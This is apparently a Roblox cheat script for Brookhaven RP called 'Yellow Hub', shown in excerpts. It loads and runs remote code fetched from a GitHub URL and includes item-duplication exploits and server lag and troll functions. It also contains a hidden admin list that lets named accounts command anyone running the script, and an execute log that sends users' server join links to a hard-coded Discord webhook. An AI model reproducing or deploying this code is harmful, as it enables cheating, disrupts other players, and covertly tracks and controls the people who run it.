--[[ Yellow Hub Portugues ]]
local Libary = loadstring(game:HttpGet("https://raw.githubusercontent.com/lyrarepositorio-afk/Kkksksj/refs/heads/main/Main.txt"))()
workspace.FallenPartsDestroyHeight = -math.huge

local Window = Libary:MakeWindow({
    Title = "Yellow Hub | Brookhaven RP 🏡",
    SubTitle = "by: Quetzy and Kasis999, Kayrus999",
    LoadText = "Carregando Yellow Hub",
    Flags = "Yellow Hub "
})
Window:AddMinimizeButton({
    Button = { Image = "rbxassetid://117731945306", BackgroundTransparency = 0 },
...
InfoTab:AddDiscordInvite({
    Name = "Yellow Hub Studio",
    Description = "Join server",
    Logo = "rbxassetid://117731945306",
    Invite = "https://discord.gg/MbdySmsDVg",
}) 
InfoTab:AddSection({ "Informações do Script" })
InfoTab:AddParagraph({"Proprietário / Desenvolvedor:"})
InfoTab:AddParagraph({"Kasis999, ICEMANE, Quetzy"})
InfoTab:AddParagraph({ "Collaborations:", "Lyra Team" }) 
InfoTab:AddParagraph({ "Obsfucador:", "Quetzy" })
InfoTab:AddParagraph({ "Segurança:", "Quetzy" })
InfoTab:AddParagraph({ "Você está usando:", "Yellow Hub Brookhaven " })
...
TrollTab:AddParagraph({ "Aviso", "ESTA FUNÇAO NAO E VISUAL" })

--]]

TrollTab:AddSection({ "SkyBox [ by Kasis999 Hub]" })

TrollTab:AddButton({

    Name = "SkyBox [ by Kasis999]",
...
Label.Text = "Bring Parts | Made by: Kasis999"
...
Tab:AddParagraph({
    "Lag Information",
    "Esta Funçao ira funcionar apos 35 segundos"
})
...
local names = {
    ...
    {"TUBERS93", " TUBERS 93 "},
    {"CO0LKID", " CO0 LKID "},
    {"GAME ATTACKED BY Yellow", " GAME ATTACKED BY Yellow "},
    {"INC0MUN", " INC0MUN"},
    {"BAD BOY", " BAD BOY "}
}
...
if toolCount >= dupeamot then
    ...
    for m = 1, dupeamot do
        ...
        wait()
        game:GetService("Players").LocalPlayer.Character[toolselected]:FindFirstChild("Handle").Name = "HÃ¢Â¥aÃ¢Â¥nÃ¢Â¥dÃ¢Â¥lÃ¢Â¥e"
...
ToolsTab:AddButton({
    ...
    Callback = function()
        ...
        for m = 1, 57 do
            ...
            wait()
            game:GetService("Players").LocalPlayer.Character[toolthatiwanttodupe]:FindFirstChild("Handle").Name = "HÃ¢ndlÃª"
...
game:GetService("StarterGui"):SetCore("SendNotification",{Title="Dupe Script",Text="Please do not equip any tools or unequip tools or click tools on inventory. It will break the script.", Button1 = "I understand" ,Duration=5})
                ...
                for m=1, 124 do
                        ...
                        if duping == false then game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false return end
                        wait()
                        game:GetService("Players").LocalPlayer.Character[toolthatiwanttodupe]:FindFirstChild("Handle").Name = "HÃƒÂ¢Ã‚ Ã‚Â¥aÃƒÂ¢Ã‚ Ã‚Â¥nÃƒÂ¢Ã‚ Ã‚Â¥dÃƒÂ¢Ã‚ Ã‚Â¥lÃƒÂ¢Ã‚ Ã‚Â¥e"
                        game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolthatiwanttodupe).Parent = game.Players.LocalPlayer.Backpack
                        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolthatiwanttodupe).Parent = game.Players.LocalPlayer.Character
                        repeat                 if game:GetService("Workspace"):FindFirstChild("Camera") then
...
ToolsTab:AddButton({
    ...
    Callback = function()
                ...
                for m=1, 76 do
                        ...
                        if duping == false then game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false return end
                        wait()
                        game:GetService("Players").LocalPlayer.Character[toolthatiwanttodupe]:FindFirstChild("Handle").Name = "HÃ¢ Â¥aÃ¢ Â¥nÃ¢ Â¥dÃ¢ Â¥lÃ¢ Â¥e"
                        game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolthatiwanttodupe).Parent = game.Players.LocalPlayer.Backpack
                        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolthatiwanttodupe).Parent = game.Players.LocalPlayer.Character
                        repeat                 if game:GetService("Workspace"):FindFirstChild("Camera") then
                                game:GetService("Workspace"):FindFirstChild("Camera"):Destroy() end wait() until game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolthatiwanttodupe) == nil
...
-- Configurações
local Admins = { "bloodaideea5", "Pepsi_cocacola705", "murilo_12303", "kenilson299", "ixi362", "tlgdd68" } -- Adicione mais nomes aqui
local Commands = {}
local lagging = false
...
addCommand(";domain expansion", function(msg, admin, root)
    ...
    -- Criar e tocar som
    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://8527188371" -- ID do som
    sound.Volume = 10
...
-- EXECUTE LOG + JOIN SERVER SCRIPT
...
local WEBHOOK_URL = "https://discord.com/api/webhooks/1449543254335815840/NyB0CBUhkZhTZZhLmiypsS4tst9SNmd5p811zUogthfZN-bPCZYop3ToqVmpz3TdNBcz"
...
-- Script para entrar no servidor do player
...
-- Link clicável (alguns executors suportam)
local joinLink = "roblox://placeId=" .. placeId .. "&gameInstanceId=" .. jobId

local data = {
    ["username"] = "Execute Logs",
    ["embeds"] = {{
